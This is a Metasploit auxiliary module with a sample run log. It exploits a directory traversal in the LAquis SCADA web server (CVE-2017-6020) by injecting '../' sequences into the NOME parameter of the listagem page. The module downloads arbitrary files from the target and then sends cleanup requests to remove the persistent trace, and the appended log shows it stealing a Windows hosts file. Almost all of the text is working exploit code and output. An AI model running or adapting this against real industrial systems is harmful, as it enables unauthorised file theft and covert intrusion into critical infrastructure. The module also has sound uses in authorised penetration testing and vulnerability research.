require 'msf/core'

class MetasploitModule < Msf::Auxiliary
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'LAquis SCADA Web Server Directory Traversal Information Disclosure',
			'Description'    => %q{
				This module exploits a directory traversal vulnerability found in the LAquis SCADA 
				application. The vulnerability is triggered when sending a series of dot dot slashes
				(../) to the vulnerable NOME parameter found on the listagem.laquis file.

				This module was tested against v4.1.0.2385
			},
			'Author'         => [ 'james fitts' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2017-6020' ],
					[ 'ZDI', '17-286' ],
					[ 'BID', '97055' ],
					[ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-082-01' ]
				],
			'DisclosureDate' => 'Mar 29 2017'))

		register_options(
			[
				OptInt.new('DEPTH', [ false, 'Levels to reach base directory', 10]),
				OptString.new('FILE', [ false, 'This is the file to download', 'boot.ini']),
				Opt::RPORT(1234)
			], self.class )
	end

	def run

	depth = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
	levels = "/" + ("../" * depth)

	res = send_request_raw({
		'method'	=>	'GET',
		'uri'			=>	'/'
	})

	# make sure the webserver is actually listening
	if res.code == 200
		blob = res.body.to_s.scan(/(?<=href=)[A-Za-z0-9.?=&+]+/)
		
		for url in blob
			if url =~ /listagem/
				listagem = url
			end
		end
		
		# make sure the vulnerable page is there
		# not all of the examples include the
		# vulnerable page, so we test to ensure
		# that it is there prior to executing our code
		# there is a potential that real world may not
		# include the vulnerable page in some cases
		# as well
		res = send_request_raw({
			'method'	=>	'GET',
			'uri'			=>	"/#{listagem}",
		})

		# trigger
		if res.code == 200 and res.body.to_s =~ /<title>Listagem<\/title><\/head>/
			
			loot = []
			file_path = "#{datastore['FILE']}"
			file_path = file_path.gsub(/\//, "\\")
			cleanup = "#{listagem}"
			cleanup = cleanup.gsub(/DATA=/, "DATA=#{Rex::Text.rand_text_alphanumeric(15)}")
			cleanup = cleanup.gsub(/botao=Enviar\+consulta/, "botao=Submit\+Query")
			vulnerability = listagem.gsub(/(?<=NOME=)[A-Za-z0-9.]+/, "#{levels}#{file_path}")

			res = send_request_raw({
				'method'	=>	'GET',
				'uri'			=>	"/#{vulnerability}"
			})

			if res and res.code == 200
				blob = res.body.to_s
				blob.each_line do |line|
					loot << line.match(/.*&nbsp;<\/font><\/td>.*$/)
				end

				loot = loot.join.gsub(/&nbsp;<\/font><\/td>/, "\r\n")

				if not loot or loot.empty?
					print_status("File from \'#{rhost}:#{rport}\' is empty...")
					return
				end
				file = ::File.basename(datastore['FILE'])
				path = store_loot('laquis.file', 'application/octet-stream', rhost, loot, file, datastore['FILE'])
				print_status("Stored \'#{datastore['FILE']}\' to \'#{path}\'")

				# cleaning up afterwards because the response
				# data from before is written and becomes
				# persistent
				referer = cleanup.gsub(/DATA=[A-Za-z0-9]+/, "DATA=")

				res = send_request_raw({
					'method'	=>	'GET',
					'uri'			=>	"/#{listagem}"
				})

				if res.code == 200
					nome = res.body.to_s.match(/(?<=<input type=hidden name=NOME value=")[A-Za-z0-9.]+/)
					cleanup = cleanup.gsub(/(?<=NOME=)[A-Za-z0-9.]+/, "#{nome}")
					res = send_request_raw({
						'method'	=>	'GET',
						'uri'			=>	"/#{cleanup}",
						'headers'	=>	{
							'Referer'	=>	"http://#{rhost}:#{rport}/#{referer}",
							'Accept-Language'	=>	'en-US,en;q=0.5',
							'Accept-Encoding'	=>	'gzip, deflate',
							'Connection'	=>	'close',
							'Upgrade-Insecure-Requests'	=>	'1',
							'Cache-Control'	=>	'max-age=0'
						}
					})
				end

				return

			end

		else
			print_error("Vulnerable page does not exist...")
		end

	else
		print_error("The server does not appear to be listening...")
	end

	end
end
__END__
msf auxiliary(laquis_directory_traversal) > show options

Module options (auxiliary/server/laquis_directory_traversal):

   Name     Current Setting                     Required  Description
   ----     ---------------                     --------  -----------
   DEPTH    10                                  no        Levels to reach base directory
   FILE     Windows/System32/drivers/etc/hosts  no        This is the file to download
   Proxies                                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST    192.168.1.2                         yes       The target address
   RPORT    1234                                yes       The target port (TCP)
   SSL      false                               no        Negotiate SSL/TLS for outgoing connections
   VHOST                                        no        HTTP server virtual host

msf auxiliary(laquis_directory_traversal) > rexploit
[*] Reloading module...

[*] Stored 'Windows/System32/drivers/etc/hosts' to '/home/james/.msf4/loot/20170927110756_default_192.168.1.2_laquis.file_227964.bin'
[*] Auxiliary module execution completed

james@bloop:~/.msf4/loot$ cat 20170927110456_default_192.168.1.2_laquis.file_677204.bin
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#
#